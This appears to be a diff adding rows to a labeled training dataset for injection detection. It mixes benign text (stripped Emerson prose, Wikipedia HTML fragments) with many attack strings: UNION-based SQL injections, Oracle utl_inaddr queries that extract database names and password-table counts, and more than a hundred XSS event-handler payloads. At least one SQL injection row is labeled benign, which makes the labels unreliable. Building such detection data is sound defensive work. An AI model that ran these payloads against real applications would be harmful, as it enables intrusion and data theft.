+" If malice vanity wear coat philanthropy, shall pass? If angry bigot assumes bountiful cause Abolition, comes last news Barbadoes, I say him, ‘Go love thy infant; love thy wood-chopper: good-natured modest: grace; never varnish hard, uncharitable ambition incredible tenderness black folk thousand miles off",0
+ Thy love afar spite home,0
+"’ Rough graceless would greeting, truth handsomer affectation love",0
+" Your goodness must edge it, — else none",0
+ The doctrine hatred must preached counteraction doctrine love pules whines,0
+" I shun father mother wife brother, genius calls me",0
+" I would write lintels door-post, Whim",0
+"select * from users where id = 1 union select .1$_,version (  )  -- 1",1
+"select * from users where id = 1 union select 1<@,version (  )  -- 1",1
+"select * from users where id = 1 union select 1<@.,version (  )  -- 1",1
+"select * from users where id = 1 union select 1 $$,version (  )  -- 1",1
+"select * from users where id = 1 union select !<1,version (  )  -- 1",1
+"select * from users where id = 1 union select +!<1,version (  )  -- 1",1
+"select * from users where id = 1 union select +!<@,version (  )  -- 1",1
+"select * from users where id = 1 union select !<@,version (  )  -- 1",1
+" Their works done apology extenuation living world, — invalids insane pay high board",0
+ Their virtues penances,0
+" I wish expiate, live",0
+ My life spectacle,0
+" I much prefer lower strain, genuine equal, glittering unsteady",0
+" I wish sound sweet, need diet bleeding",0
+" I ask primary evidence man, refuse appeal man actions",0
+ I know makes difference whether I forbear actions reckoned excellent,0
+ I cannot consent pay privilege I intrinsic right,0
+" Few mean gifts may be, I actually am, need assurance assurance fellows secondary testimony",0
+" What I must concerns me, people think",0
+" This rule, equally arduous actual intellectual life, may serve whole distinction greatness meanness",0
+"select * from users where id = 1 union select 1 1a,version (  )  -- 1",1
+"select * from users where id = 1 union select 1<@$,version (  )  -- 1",1
+"select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1",1
+" But work, I shall know you",0
+" Do work, shall reinforce yourself",0
+ A man must consider blindman’s-buff game conformity,0
+" If I know sect, I anticipate argument",0
+ I hear preacher announce text topic expediency one institutions church,0
+" Do I know beforehand possibly say new spontaneous word? Do I know that, ostentation examining grounds institution, thing? Do I know pledged look one side, — permitted side, man, parish minister? He retained attorney, airs bench emptiest affectation",0
+" Well, men bound eyes one another handkerchief, attached one communities opinion",0
+" This conformity makes false particulars, authors lies, false particulars",0
+ Their every truth quite true,0
+" Their two real two, four real four; every word say chagrins us, know begin set right",0
+ Meantime nature slow equip us prison-uniform party adhere,0
+ For nonconformity world whips displeasure,0
+ And therefore man must know estimate sour face,0
+ The by-standers look askance public street friend’s parlour,0
+" If aversation origin contempt resistance like own, might well go home sad countenance; sour faces multitude, like sweet faces, deep cause, put wind blows newspaper directs",0
+ Yet discontent multitude formidable senate college,0
+ It easy enough firm man knows world brook rage cultivated classes,0
+" Their rage decorous prudent, timid vulnerable themselves",0
+" But feminine rage indignation people added, ignorant poor aroused, unintelligent brute force lies bottom society made growl mow, needs habit magnanimity religion treat godlike trifle concernment",0
+" The terror scares us self-trust consistency; reverence past act word, eyes others data computing orbit past acts, loath disappoint them",0
+" But keep head shoulder? Why drag corpse memory, lest contradict somewhat stated public place? Suppose contradict yourself; then? It seems rule wisdom never rely memory alone, scarcely even acts pure memory, bring past judgment thousand-eyed present, live ever new day",0
+" In metaphysics denied personality Deity: yet devout motions soul come, yield heart life, though clothe God shape color",0
+ He may well concern shadow wall,0
+" Speak think hard words, to-morrow speak to-morrow thinks hard words again, though contradict every thing said to-day",0
+" — ‘Ah, shall sure misunderstood",0
+"’ — Is bad, then, misunderstood? Pythagoras misunderstood, Socrates, Jesus, Luther, Copernicus, Galileo, Newton, every pure wise spirit ever took flesh",0
+ To great misunderstood,0
+select * from users where id = 1 +$ . or 1 = 1 -- 1,0
+"select * from users where id = 1 +$ . union select null,@@VERSION -- 1",1
+select * from users where id = 1 +$ 1 or 1 = 1 -- 1,1
+" Men imagine communicate virtue vice overt actions, see virtue vice emit breath every moment",0
+" There agreement whatever variety actions, honest natural hour",0
+" For one will, actions harmonious, however unlike seem",0
+" These varieties lost sight little distance, little height thought",0
+select * from users where id = 1 +1 or 1 = 1 -- 1,1
+select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1,1
+"select * from users where id = 1 + ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1",1
+"select * from users where id = 1 + ( 1 )  union select null,banner from v$version where rownum = 1 -- 1",1
+"select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1",1
+"select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1",1
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.DATABASE_NAME FROM DUAL  )  )   AND 'i' = 'i,1
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT host_name FROM v$instance  )  )   AND 'i' = 'i,1
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT global_name FROM global_name  )  )   AND 'i' = 'i,1
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( USERNAME  )  )   FROM SYS.ALL_USERS  )  )   AND 'i' = 'i,1
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( PASSWORD  )  )   FROM SYS.USER$  )  )   AND 'i' = 'i,1
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( table_name  )  )   FROM sys.all_tables  )  )   AND 'i' = 'i,1
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( column_name  )  )   FROM sys.all_tab_columns  )  )   AND 'i' = 'i,1
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( GRANTED_ROLE  )  )   FROM DBA_ROLE_PRIVS WHERE GRANTEE = SYS.LOGIN_USER  )  )   AND 'i' = 'i,1
+"<li><a href=""/wiki/File:Socrates.png"" class=""image""><img alt=""Socrates.png"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/18px-Socrates.png"" decoding=""async"" width=""18"" height=""28"" class=""noviewer"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/27px-Socrates.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/36px-Socrates.png 2x"" data-file-width=""326"" data-file-height=""500"" /> </a> <a href=""/wiki/Portal:Philosophy"" title=""Portal:Philosophy"">Philosophy&#32;portal </a> </li> </ul>",0
+"<tt onmouseover=""alert(1)"">test</tt>",1
+"</span> <span class=""reference-text"">Steering for the 1995 ""<a href=""/wiki/History_of_autonomous_cars#1990s"" class=""mw-redirect"" title=""History of autonomous cars"">No Hands Across America </a>"" required ""only a few human assists"".",0
+"</span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.mileseducation.com/finance/artificial_intelligence"">""Miles Education | Future Of Finance | Blockchain Fundamentals for F&amp;A Professionals Certificate"" </a>. <i>www.mileseducation.com </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">26 September",0
+"</span>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2FS0921-8890%2805%2980025-9"">10.1016/S0921-8890(05)80025-9 </a>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20070809020912/http://people.csail.mit.edu/brooks/papers/elephants.pdf"">Archived </a> <span class=""cs1-format"">(PDF)",0
+"<li id=""cite_note-118""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-118"">^ </a> </b>",0
+"<li><a href=""/wiki/Contextualism"" title=""Contextualism"">Contextualism </a> </li>",0
+"<li id=""cite_note-Representing_causation-95""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Representing_causation_95-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Representing_causation_95-1""><sup><i><b>b </b> </i> </sup> </a>",0
+"<tr><td class=""plainlist"" style=""padding:0 0.1em 0.4em"">",0
+ </span>,0
+"<li><a href=""/wiki/Mind%E2%80%93body_problem"" title=""Mind–body problem"">Mind–body problem </a>",0
+<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>,1
+"<col draggable=""true"" ondragenter=""alert(1)"">test</col>",1
+<caption onpointerdown=alert(1)>XSS</caption>,1
+</span>,0
+"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
+<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>,1
+"<style onmouseleave=""alert(1)"">test</style>",1
+<svg><meta onload=alert(1)></meta>,1
+"<li><a href=""/wiki/Programming_language"" title=""Programming language"">Programming language </a> </li>",0
+<figcaption onpointerleave=alert(1)>XSS</figcaption>,1
+"</span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.economist.com/news/special-report/21700756-artificial-intelligence-boom-based-old-idea-modern-twist-not"">""From not working to neural networking"" </a>. <i>The Economist </i>. 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">26 April",0
+</div>,0
+<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>,1
+<input type=image src=1 onerror=alert(1)>,1
+"<strong ondblclick=""alert(1)"">test</strong>",1
+"<li><a href=""/wiki/Computer_data_storage"" title=""Computer data storage"">Information storage systems </a> </li>",0
+"<div draggable=""true"" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>",1
+"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
+"</span> <span class=""reference-text""><cite class=""citation journal""><a href=""/wiki/Woody_Evans"" title=""Woody Evans"">Evans, Woody </a> (2015). ""Posthuman Rights: Dimensions of Transhuman Worlds"". <i>Teknokultura </i>. <b>12 </b> (2). <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.5209%2Frev_TK.2015.v12.n2.49072"">10.5209/rev_TK.2015.v12.n2.49072 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Teknokultura&amp;rft.atitle=Posthuman+Rights%3A+Dimensions+of+Transhuman+Worlds&amp;rft.volume=12&amp;rft.issue=2&amp;rft.date=2015&amp;rft_id=info%3Adoi%2F10.5209%2Frev_TK.2015.v12.n2.49072&amp;rft.aulast=Evans&amp;rft.aufirst=Woody&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"<spacer onkeypress=""alert(1)"" contenteditable>test</spacer>",1
+"<li><cite id=""CITEREFOudeyer2010"" class=""citation journal"">Oudeyer, P-Y. (2010). <a rel=""nofollow"" class=""external text"" href=""http://www.pyoudeyer.com/IEEETAMDOudeyer10.pdf"">""On the impact of robotics in behavioral and cognitive sciences: from insect navigation to human cognitive development"" </a> <span class=""cs1-format"">(PDF)",0
+"<style>@keyframes slidein {}</style><center style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></center>",1
+"<pre draggable=""true"" ondragend=""alert(1)"">test</pre>",1
+ </span>,0
+"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 8 </li> </ul>",0
+<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>,1
+"<style>@keyframes x{}</style><main style=""animation-name:x"" onanimationstart=""alert(1)""></main>",1
+"<article draggable=""true"" ondrag=""alert(1)"">test</article>",1
+"<li><a href=""/wiki/Computational_physics"" title=""Computational physics"">Computational physics </a> </li>",0
+"</span>. <i>Behavioral and Brain Sciences </i>. <b>3 </b> (3): 417–457. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1017%2FS0140525X00005756"">10.1017/S0140525X00005756 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Behavioral+and+Brain+Sciences&amp;rft.atitle=Minds%2C+Brains+and+Programs&amp;rft.volume=3&amp;rft.issue=3&amp;rft.pages=417-457&amp;rft.date=1980&amp;rft_id=info%3Adoi%2F10.1017%2FS0140525X00005756&amp;rft.aulast=Searle&amp;rft.aufirst=John&amp;rft_id=http%3A%2F%2Fcogprints.org%2F7150%2F1%2F10.1.1.83.5248.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"<rtc draggable=""true"" ondragleave=""alert(1)"">test</rtc>",1
+"</span> <span class=""reference-text""><cite class=""citation journal"">Prakken, Henry (31 August 2017). ""On the problem of making autonomous vehicles conform to traffic law"". <i>Artificial Intelligence and Law </i>. <b>25 </b> (3): 341–363. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2Fs10506-017-9210-0"">10.1007/s10506-017-9210-0 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Artificial+Intelligence+and+Law&amp;rft.atitle=On+the+problem+of+making+autonomous+vehicles+conform+to+traffic+law&amp;rft.volume=25&amp;rft.issue=3&amp;rft.pages=341-363&amp;rft.date=2017-08-31&amp;rft_id=info%3Adoi%2F10.1007%2Fs10506-017-9210-0&amp;rft.aulast=Prakken&amp;rft.aufirst=Henry&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+" </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
+"<sup id=""cite_ref-Biological_intelligence_vs._intelligence_in_general_16-1"" class=""reference""><a href=""#cite_note-Biological_intelligence_vs._intelligence_in_general-16"">&#91;16&#93; </a> </sup>",0
+"			<div class=""thumbcaption"">",0
+"<li id=""cite_note-recurse-409""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-recurse_409-0"">^ </a> </b>",0
+"<div draggable=""true"" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>",1
+		 </div>,0
+"<li><a href=""/wiki/Glossary_of_calculus"" title=""Glossary of calculus"">Calculus </a> </li>",0
+"<frame oncut=""alert(1)"" contenteditable>test</frame>",1
+"<ul class=""simple"">",0
+"<frameset onmouseover=""alert(1)"">test</frameset>",1
+"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationstart=""alert(1)""></nobr>",1
+"<h4><span class=""mw-headline"" id=""Technological_singularity"">Technological singularity",0
+</span>(1700) </li>,0
+<iframe onload=alert(1)></iframe>,1
+"<strong draggable=""true"" ondragstart=""alert(1)"">test</strong>",1
+</span> </h3>,0
+"<li id=""cite_note-304""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-304"">^ </a> </b>",0
+"<!DOCTYPE html><html class=""no-js"" lang=""en"" > ",0
+"<style>@keyframes x{}</style><h1 style=""animation-name:x"" onanimationstart=""alert(1)""></h1>",1
+<article onpointerleave=alert(1)>XSS</article>,1
+"<nextid onmousemove=""alert(1)"">test</nextid>",1
+javascript:document.location=,1
+"<style>@keyframes x{}</style><area style=""animation-name:x"" onanimationend=""alert(1)""></area>",1
+<blockquote onpointermove=alert(1)>XSS</blockquote>,1
+<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>,1
+"<div style=""padding:0em 0.25em"">",0
+"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
+	 </span>,0
+"<style>@keyframes x{}</style><title style=""animation-name:x"" onanimationend=""alert(1)""></title>",1
+"<li><a href=""/wiki/Brain%E2%80%93computer_interface"" title=""Brain–computer interface"">Neurocybernetics </a> </li>",0
+"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Mathematics<br />of computing </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
+"<h2>Built-in services<a class=""headerlink"" href=""#built-in-services"" title=""Permalink to this headline"">¶</a></h2>",0
+<noembed onpointerout=alert(1)>XSS</noembed>,1
+"<data onbeforecut=""alert(1)"" contenteditable>test</data>",1
+"<A HREF=""http://ha.ckers.org@google""></A>",1
+"<plaintext oncut=""alert(1)"" contenteditable>test</plaintext>",1
+"<s onmousedown=""alert(1)"">test</s>",1
+"<address onkeypress=""alert(1)"" contenteditable>test</address>",1
+"<div style=""padding:0em 0.25em"">",0
+"<optgroup onmouseover=""alert(1)"">test</optgroup>",1
+"	 </span> <span class=""reference-text"">",0
+"</span> <span class=""reference-text"">Celli, Fabio, Pietro Zani Massani, and Bruno Lepri. ""Profilio: Psychometric Profiling to Boost Social Media Advertising."" Proceedings of the 2017 ACM on Multimedia Conference. ACM, 2017  <a rel=""nofollow"" class=""external autonumber"" href=""https://www.researchgate.net/publication/320542489_Profilio_Psychometric_Profiling_to_Boost_Social_Media_Advertising"">[1] </a>",0
+	 </span>,0
+"<li><a href=""/wiki/Computability_theory"" title=""Computability theory"">Computability theory </a> </li>",0
+"<script onmouseover=""alert(1)"">test</script>",1
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></sub>",1
+testing.</p>,0
+"<image onclick=""alert(1)"">test</image>",1
+ </li>,0
+"<tfoot onclick=""alert(1)"">test</tfoot>",1
+<ul onpointerenter=alert(1)>XSS</ul>,1
+"<bdo draggable=""true"" ondragenter=""alert(1)"">test</bdo>",1
+"<li><a href=""/wiki/Mind"" title=""Mind"">Mind </a> </li>",0
+<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>,1
+"<style>@keyframes slidein {}</style><shadow style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></shadow>",1
+<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>,1
+"<dd onmouseout=""alert(1)"">test</dd>",1
+"<div class=""thumb tright"">",0
+<pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>,1
+"<li><a href=""/wiki/Automated_planning_and_scheduling"" title=""Automated planning and scheduling"">Planning </a> </li>",0
+"	 </span> <span class=""reference-text"">",0
+"<data draggable=""true"" ondragstart=""alert(1)"">test</data>",1
+</ul>,0
+"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;649–788, </li>",0
+"<li><a href=""/wiki/Underdetermination"" title=""Underdetermination"">Underdetermination </a> </li>",0
+"</span> <span class=""reference-text""><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;480–483.",0
+</span> </h4>,0
+"        <a href=""intro/overview.html"" class=""btn btn-neutral float-right"" title=""Scrapy at a glance"" accesskey=""n"" rel=""next"">Next <span class=""fa fa-arrow-circle-right"">",0
+"</span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=ZDNet&amp;rft.atitle=Half+of+Americans+do+not+believe+deepfake+news+could+target+them+online&amp;rft.aulast=Brown&amp;rft.aufirst=Eileen&amp;rft_id=https%3A%2F%2Fwww.zdnet.com%2Farticle%2Fhalf-of-americans-do-not-believe-deepfake-news-could-target-them-online%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"<sub draggable=""true"" ondragend=""alert(1)"">test</sub>",1
+"<li><cite id=""CITEREFTuring1950"" class=""citation""><a href=""/wiki/Alan_Turing"" title=""Alan Turing"">Turing, Alan </a> (October 1950), ""Computing Machinery and Intelligence"", <i><a href=""/wiki/Mind_(journal)"" title=""Mind (journal)"">Mind </a> </i>, <b>LIX </b> (236): 433–460, <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1093%2Fmind%2FLIX.236.433"">10.1093/mind/LIX.236.433 </a>, <a href=""/wiki/International_Standard_Serial_Number"" title=""International Standard Serial Number"">ISSN </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//www.worldcat.org/issn/0026-4423"">0026-4423 </a> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Mind&amp;rft.atitle=Computing+Machinery+and+Intelligence&amp;rft.volume=LIX&amp;rft.issue=236&amp;rft.pages=433-460&amp;rft.date=1950-10&amp;rft_id=info%3Adoi%2F10.1093%2Fmind%2FLIX.236.433&amp;rft.issn=0026-4423&amp;rft.aulast=Turing&amp;rft.aufirst=Alan&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"<dialog draggable=""true"" ondragenter=""alert(1)"">test</dialog>",1
+<iframe onblur=alert(1) id=x><input autofocus>,1
+<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>,1
+"        <script src=""_static/js/hoverxref.js""></script>",0
+</span>(2014) </li>,0
+Refuting Mathematical Objection:,0
+	 </span> </li>,0
+	 </span> </li>,0
+<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>,1
+ </li>,0
+"<li><a href=""/wiki/Philosophy_of_computer_science"" title=""Philosophy of computer science"">Computer science </a> </li> </ul> </li>",0
+"<em draggable=""true"" ondragleave=""alert(1)"">test</em>",1
+</span> </h4>,0
+"<small onbeforecut=""alert(1)"" contenteditable>test</small>",1
+"<article draggable=""true"" ondragstart=""alert(1)"">test</article>",1
+"<cite onkeyup=""alert(1)"" contenteditable>test</cite>",1
+<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>,1
+<data onpointerleave=alert(1)>XSS</data>,1
+"<audio draggable=""true"" ondragend=""alert(1)"">test</audio>",1
+</span>(2012) </li>,0
+"<li><a href=""/wiki/Juggling_robot"" title=""Juggling robot"">Juggling </a> </li>",0
+"<li id=""cite_note-FOOTNOTEWengMcClellandPentlandSporns2001-168""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEWengMcClellandPentlandSporns2001_168-0"">^ </a> </b>",0
+"<dd onbeforecopy=""alert(1)"" contenteditable>test</dd>",1
+	 </span> </li>,0
+<del id=x tabindex=1 onactivate=alert(1)></del>,1
+"<svg onbeforecut=""alert(1)"" contenteditable>test</svg>",1
+"<li id=""cite_note-262""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-262"">^ </a> </b>",0
+"<li class=""toclevel-2 tocsection-15""><a href=""#Cybernetics_and_brain_simulation""><span class=""tocnumber"">5.1",0
+<optgroup onpointerover=alert(1)>XSS</optgroup>,1
+	 </span>,0
+"</li><li style=""min-height: 31px;""><span style=""display: inline-block; width: 31px; line-height: 31px; vertical-align: middle; text-align: center;""><img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Wikibooks-logo.svg/27px-Wikibooks-logo.svg.png"" decoding=""async"" width=""27"" height=""27"" style=""vertical-align: middle"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Wikibooks-logo.svg/41px-Wikibooks-logo.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Wikibooks-logo.svg/54px-Wikibooks-logo.svg.png 2x"" data-file-width=""300"" data-file-height=""300"" />",0
+<audio onpointermove=alert(1)>XSS</audio>,1
+"<aside onmouseout=""alert(1)"">test</aside>",1
+	 <div>,0
+"<li><a href=""/wiki/Viv_(software)"" title=""Viv (software)"">Viv </a><span class=""nowrap"">&#160;",0
+	 </span> </a> </li>,0
+"<canvas onbeforecut=""alert(1)"" contenteditable>test</canvas>",1
+	 </span>,0
+"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
+	 </span>,0
+"<div draggable=""true"" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>",1
+"<tbody draggable=""true"" ondragenter=""alert(1)"">test</tbody>",1
+"</span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=48"" title=""Edit section: Philosophy and ethics"">edit </a><span class=""mw-editsection-bracket"">]",0
+"<li id=""cite_note-Robotic_mapping-131""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Robotic_mapping_131-0"">^ </a> </b>",0
+"<object onmousedown=""alert(1)"">test</object>",1
+"<area onbeforepaste=""alert(1)"" contenteditable>test</area>",1
+ </li>,0
+"<ul><li><a href=""#CITEREFKurzweil1999"">Kurzweil 1999 </a> and <a href=""#CITEREFKurzweil2005"">Kurzweil 2005 </a> </li> </ul>",0
+<template onpointerout=alert(1)>XSS</template>,1
+"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/>",0
+<s onpointerup=alert(1)>XSS</s>,1
+"<select draggable=""true"" ondrag=""alert(1)"">test</select>",1
+"<a onmouseup=""alert(1)"">test</a>",1
+"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Related techniques </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
+"<li id=""cite_note-59""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-59"">^ </a> </b>",0
+"<style>:target {color: red;}</style><pre id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></pre>",1
+"<li><a href=""/wiki/Photo_manipulation"" title=""Photo manipulation"">Image manipulation </a> </li>",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></a>",1
+<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>,1
+"<time onclick=""alert(1)"">test</time>",1
+	 </span>,0
+"<canvas onbeforepaste=""alert(1)"" contenteditable>test</canvas>",1
+<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>,1
+"<li><a href=""/wiki/Centre_for_the_Study_of_Existential_Risk"" title=""Centre for the Study of Existential Risk"">Centre for the Study of Existential Risk </a> </li>",0
+"<li><cite id=""CITEREFLenatGuha1989"" class=""citation book""><a href=""/wiki/Douglas_Lenat"" title=""Douglas Lenat"">Lenat, Douglas </a>; Guha, R. V. (1989). <i>Building Large Knowledge-Based Systems </i>. Addison-Wesley. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-201-51752-1"" title=""Special:BookSources/978-0-201-51752-1""><bdi>978-0-201-51752-1 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Building+Large+Knowledge-Based+Systems&amp;rft.pub=Addison-Wesley&amp;rft.date=1989&amp;rft.isbn=978-0-201-51752-1&amp;rft.aulast=Lenat&amp;rft.aufirst=Douglas&amp;rft.au=Guha%2C+R.+V.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"<li id=""cite_note-Brain_simulation-153""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Brain_simulation_153-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Brain_simulation_153-1""><sup><i><b>b </b> </i> </sup> </a>",0
+"<ul><li><cite class=""citation book""><a href=""/wiki/David_Berlinski"" title=""David Berlinski"">Berlinski, David </a> (2000). <a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/adventofalgorith0000berl""><i>The Advent of the Algorithm </i> </a>. Harcourt Books. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-15-601391-8"" title=""Special:BookSources/978-0-15-601391-8""><bdi>978-0-15-601391-8 </bdi> </a>. <a href=""/wiki/OCLC"" title=""OCLC"">OCLC </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//www.worldcat.org/oclc/46890682"">46890682 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=The+Advent+of+the+Algorithm&amp;rft.pub=Harcourt+Books&amp;rft.date=2000&amp;rft_id=info%3Aoclcnum%2F46890682&amp;rft.isbn=978-0-15-601391-8&amp;rft.aulast=Berlinski&amp;rft.aufirst=David&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fadventofalgorith0000berl&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"<center onclick=""alert(1)"">test</center>",1
+"<h1 draggable=""true"" ondragleave=""alert(1)"">test</h1>",1
+"<div onkeyup=""alert(1)"" contenteditable>test</div>",1
+<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>,1
+"<dl draggable=""true"" ondrag=""alert(1)"">test</dl>",1
+<div onpointerout=alert(1)>XSS</div>,1
+</span> </h4>,0
+"<style>:target {color:red;}</style><slot id=x style=""transition:color 1s"" ontransitionend=alert(1)></slot>",1
+"<applet onmouseover=""alert(1)"">test</applet>",1
+"<figure onbeforecut=""alert(1)"" contenteditable>test</figure>",1
+"<canvas onmousemove=""alert(1)"">test</canvas>",1
+"<h1 onpaste=""alert(1)"" contenteditable>test</h1>",1
